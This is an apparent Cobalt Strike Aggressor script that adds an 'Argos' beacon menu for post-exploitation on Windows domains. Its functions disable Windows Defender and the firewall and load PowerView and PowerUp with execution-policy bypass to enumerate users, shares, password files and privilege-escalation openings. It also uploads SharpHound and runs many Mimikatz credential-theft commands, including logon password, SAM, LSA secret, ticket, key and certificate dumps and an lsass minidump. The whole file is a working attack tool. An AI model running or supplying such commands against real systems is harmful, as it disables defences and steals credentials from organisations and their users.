## Antivirus functions
# Disable Windows Defender
sub disableWindowsDefender {
    bpowershell($1, "powershell -ep bypass");
    bpowershell($1, "Set-MpPreference -DisableRealtimeMonitoring $true");
}

# # Disable Windows Defender IOAV
sub disableWindowsDefenderIOAV {
    bpowershell($1, "Set-MpPreference -DisableIOAVprotection $true -Verbose");
}

### Firewall

# Disable Firewall
sub disableFirewall {
    bpowershell($1, "netsh firewall set opmode disable");
}

# Show Firewall Status
sub showFirewallStatus {
    bpowershell($1, "netsh firewall show state");
}

# Show firewall configuration
sub showFirewallConfig {
    bpowershell($1, "netsh firewall show config");
}

### PowerView functions
# Function to import PowerView from /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
sub importPowerView {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "powershell -ep bypass");
    bpowershell_import($beaconId, "/usr/share/windows-resources/powersploit/Recon/PowerView.ps1");
}

# Define functions for local admin enumeration
sub invokeEnumerateLocalAdmin {
    bpowerpick($1, "Invoke-EnumerateLocalAdmin");
}

sub invokeEnumerateLocalAdminSelectAccountName {
    bpowerpick($1, "Invoke-EnumerateLocalAdmin | select AccountName");
}

# Define functions for user enumeration
sub getNetUser {
    bpowerpick($1, "Get-NetUser");
}

sub getNetUserCN {
    bpowerpick($1, "Get-NetUser | select cn");
}

sub getNetUserSamAccountName {
    bpowerpick($1, "Get-NetUser | select samaccountname");
}

sub getNetUserExpandSamAccountName {
    bpowerpick($1, "Get-NetUser | select -expandproperty samaccountname");
}

sub getNetUserDescription {
    bpowerpick($1, "Get-NetUser | select description");
}

sub getUserProperty {
    bpowerpick($1, "Get-UserProperty");
}

sub getUserPropertyPwdLastSet {
    bpowerpick($1, "Get-UserProperty -Properties pwdlastset");
}

sub getUserPropertyLogonCount {
    bpowerpick($1, "Get-UserProperty -Properties logoncount");
}

sub getUserPropertyBadPwdCount {
    bpowerpick($1, "Get-UserProperty -Properties badpwdcount");
}

sub listAllRDPUsers {
    bpowerpick($1, "Get-NetGroupMember -GroupName RDPUsers");
}

# Define functions for computer enumeration
sub getNetComputer {
    bpowerpick($1, "Get-NetComputer");
}

sub getNetComputerFullData {
    bpowerpick($1, "Get-NetComputer -FullData");
}

sub getDomainComputerDnsHostname {
    bpowerpick($1, "Get-DomainComputer | select -ExpandProperty dnshostname");
}

sub getNetComputerCNandOS {
    bpowerpick($1, "Get-NetComputer | Select cn,OperatingSystem");
}

sub listComputerUnconstrainedDelegation {
    bpowerpick($1, "Get-NetComputer -Unconstrained | select -ExpandProperty name");
}

# Define functions for share enumeration
sub invokeEnumerateShares {
    bpowerpick($1, "Invoke-ShareFinder");
}

sub enumerateDomainShares {
    bpowerpick($1, "Find-DomainShare");
}

sub enumerateSharesWithAccess {
    bpowerpick($1, "Find-DomainShare -CheckShareAccess");
}

sub enumerateInterestingFiles {
    bpowerpick($1, "Find-InterestingDomainShareFile -Include *passwords*");
}

# Define functions for file enumeration
sub invokeFileFinder {
    bpowerpick($1, "Invoke-FileFinder");
}

sub invokeFileFinderSelectFullName {
    bpowerpick($1, "Invoke-FileFinder | select FullName");
}

# Define functions for GPO enumeration
sub enumerateGPOVerbose {
    bpowerpick($1, "Get-NetGPOGroup");
}

sub getDomainGPO {
    bpowerpick($1, "Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName");
}

sub getNetGPO {
    bpowerpick($1, "Get-NetGPO");
}

sub listAllOUs {
    bpowerpick($1, "Get-NetOU");
}

### Bloodhound

sub uploadBloodHound {
    local('$beaconId');
    $beaconId = $1;
    bupload($beaconId, "/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe");
}

sub ExecuteCollectionMethodAll {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, ".\\SharpHound.exe /all");
}

### PowerUp functions
# Invoking
sub invokePowerUp {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "powershell -ep bypass");
    bpowershell_import($beaconId, "/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1");
}

sub invokePowerUpAllChecks {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Invoke-AllChecks");
}

## Enumerate Service Vulnerabilities
sub PowerUpModifiableService {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-ModifiableService");
}

sub PowerUpmodifiableServiceFile {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-ModifiableServiceFile");
}

sub PowerUpServiceUnquoted {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-ServiceUnquoted");
}

## RegistryCheck
sub PowerUpRegistryAlwaysInstallElevated {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-RegistryAlwaysInstallElevated");
}

sub PowerUpRegistryAutoLogon {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-RegistryAutoLogon");
}

sub PowerUpRegistryStoredCreds {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-ModifiableRegistryAutoRun");
}

## Misc
sub PowerUpUnattendedInstallFile {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-UnattendedInstallFile");
}

sub PowerUpgetwebconfig {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-WebConfig");
}

sub PowerUpGet-ProcessTokenPrivilege {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-ProcessTokenPrivilege");
}

sub PowerUpgetsitelistpassword {
    local('$beaconId');
    $beaconId = $1;
    bpowershell($beaconId, "Get-SiteListPassword");
}

### Mimikatz functions
sub mimikatz_debug {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "privilege::debug");
}

sub token_elevate {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "token::elevate");
}

sub token_revert {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "token::elevate");
}

sub mimikatz_sekurlsa_logonpass {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "sekurlsa::logonpasswords");
}

sub mimikatz_sekurlsa_logpassfull {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "sekurlsa::logonPasswords full");
}

sub mimikatz_sekurlsa_tickets {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "sekurlsa::tickets /export");
}

sub crypto_capi {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "crypto::capi");
}

sub crypto_cng {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "crypto::cng");
}

sub crypto_certificates_export {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "crypto::certificates /export");
}

sub crypto_certificates_export_systemstore {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE");
}

sub crypto_keys_export {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "crypto::keys /export");
}

sub crypto_keys_export_machine {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "crypto::keys /machine /export");
}

sub vault {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "vault::cred");
}

sub vault_list {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "vault::list");
}

sub lsadump_sam {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "lsadump::sam");
}

sub lsadump_secrets {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "lsadump::secrets");
}

sub lsadump_cache {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "lsadump::cache");
}

sub ekeys {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "sekurlsa::ekeys");
}

sub dpapi {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "sekurlsa::dpapi");
}

sub minidump {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "sekurlsa::minidump lsass.dmp");
}

sub mimi_tgt {
    local('$beaconId');
    $beaconId = $1;
    bmimikatz($beaconId, "kerberos::tgt");
}

# Argos Menu / Submenu
popup beacon_top {
    menu "Argos" {
        menu "AV" {
            item "Disable Windows Defender" { disableWindowsDefender($1); }
            item "Disable Windows Defender IOAV" { disableWindowsDefenderIOAV($1); }
        }
        menu Firewall{
            item "Disable Firewall" { disableFirewall($1); }
            item "Show Firewall Status" { showFirewallStatus($1); }
            item "Show Firewall Configuration" { showFirewallConfig($1); }
        }
        menu "PowerView" {
            item "Import PowerView" { importPowerView($1); }
            menu "Enumerate Local Admins" {
                item "Enumerate all local admins" { invokeEnumerateLocalAdmin($1); }
                item "List local admins account names" { invokeEnumerateLocalAdminSelectAccountName($1); }
            }
            menu "Enumerate Users" {
                item "Dump all users and information" { getNetUser($1); }
                item "List usernames (CN)" { getNetUserCN($1); }
                item "List usernames (SamAccountName)" { getNetUserSamAccountName($1); }
                item "List usernames (expanded SamAccountName)" { getNetUserExpandSamAccountName($1); }
                item "List user descriptions" { getNetUserDescription($1); }
                item "Show all user properties" { getUserProperty($1); }
                item "Show password last set date" { getUserPropertyPwdLastSet($1); }
                item "Show user login count" { getUserPropertyLogonCount($1); }
                item "Show bad password count" { getUserPropertyBadPwdCount($1); }
                item "List all RDP Users" { listAllRDPUsers($1); }
            }
            menu "Enumerate Computers" {
                item "List all workstations in the domain" { getNetComputer($1); }
                item "Get detailed information on all domain computers" { getNetComputerFullData($1); }
                item "List DNS hostnames of domain computers" { getDomainComputerDnsHostname($1); }
                item "List computer names and operating systems" { getNetComputerCNandOS($1); }
                item "List computers with unconstrained delegation" { listComputerUnconstrainedDelegation($1); }
            }
            menu "Enumerate Shares" {
                item "Invoke Module ShareFinder" { invokeEnumerateShares($1); }
                item "Enumerate Domain Shares" { enumerateDomainShares($1); }
                item "Enumerate Shares that current User has Access" { enumerateSharesWithAccess($1); }
                item "Enumerate Files that include *passwords*" { enumerateInterestingFiles($1); }
            }
            menu "Enumerate Files" {
                item "Invoke Module FileFinder" { invokeFileFinder($1); }
                item "List full names of found files" { invokeFileFinderSelectFullName($1); }
            }
            menu "GPO Enumeration" {
                item "Enumerate GPOs" { enumerateGPOVerbose($1); }
                item "List the names of the policies" { getDomainGPO($1); }
                item "List all policies with details" { getNetGPO($1); }
                item "List all Organization Units" { listAllOUs($1); }
            }
        }
        menu "Bloodhound" {
            item "Upload BloodHound" { uploadBloodHound($1); }
            item "Execute Collection Method All" { ExecuteCollectionMethodAll($1); }
        }
        menu "PowerUp" {
            item "Import PowerUp" { invokePowerUp($1); }
            item "Invoke-AllChecks" { invokePowerUpAllChecks($1); }
            menu "Enumerate Service Vulnerabilities" {
                item "Get-ModifiableService" { PowerUpModifiableService($1); }
                item "Get-ModifiableServiceFile" { PowerUpmodifiableServiceFile($1); }
                item "Get-ServiceUnquoted" { PowerUpServiceUnquoted($1); }
            }
            menu "RegistryCheck" {
                item "Get-RegistryAlwaysInstallElevated" { PowerUpRegistryAlwaysInstallElevated($1); }
                item "Get-RegistryAutoLogon" { PowerUpRegistryAutoLogon($1); }
                item "Get-ModifiableRegistryAutoRun" { PowerUpRegistryStoredCreds($1); }
            }
            menu "Misc" {
                item "Get-UnattendedInstallFile" { PowerUpUnattendedInstallFile($1); }
                item "Get-WebConfig" { PowerUpgetwebconfig($1); }
                item "Get-ProcessTokenPrivilege" { PowerUpGet-ProcessTokenPrivilege($1); }
                item "Get-SiteListPassword" { PowerUpgetsitelistpassword($1); }
            }
        }
        menu "Mimikatz" {
            item "Privilege::Debug" { mimikatz_debug($1); }
            menu token {
                item "token::elevate" { token_elevate($1); }
                item "token::revert" { token_revert($1); }
            }
            menu sekurlsa {
                item "sekurlsa::logonpasswords" { mimikatz_sekurlsa_logonpass($1); }
                item "sekurlsa::logonPasswords full" { mimikatz_sekurlsa_logpassfull($1); }
                item "sekurlsa::tickets /export" { mimikatz_sekurlsa_tickets($1); }
            }
            menu crypto {
                item "crypto::capi" { crypto_capi($1); }
                item "crypto::cng" { crypto_cng($1); }
                item "crypto::certificates /export" { crypto_certificates_export($1); }
                item "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE" { crypto_certificates_export_systemstore($1); }
                item "crypto::keys /export" { crypto_keys_export($1); }
                item "crypto::keys /machine /export" { crypto_keys_export_machine($1); }
            }
            menu vault {
                item "vault::cred" { vault($1); }
                item "vault::list" { vault_list($1); }
            }
            menu lsa {
                item "lsadump::sam" { lsadump_sam($1); }
                item "lsadump::secrets" { lsadump_secrets($1); }
                item "lsadump::cache" { lsadump_cache($1); }
            }
            menu ekeys {
                item "sekurlsa::ekeys" { ekeys($1); }
            }
            menu dpapi {
                item "sekurlsa::dpapi" { dpapi($1); }
            }
            menu minidump {
                item "sekurlsa::minidump lsass.dmp" { minidump($1); }
            }
            menu tgt {
                item "kerberos::tgt" { mimi_tgt($1); }
            }
        }
    }
}
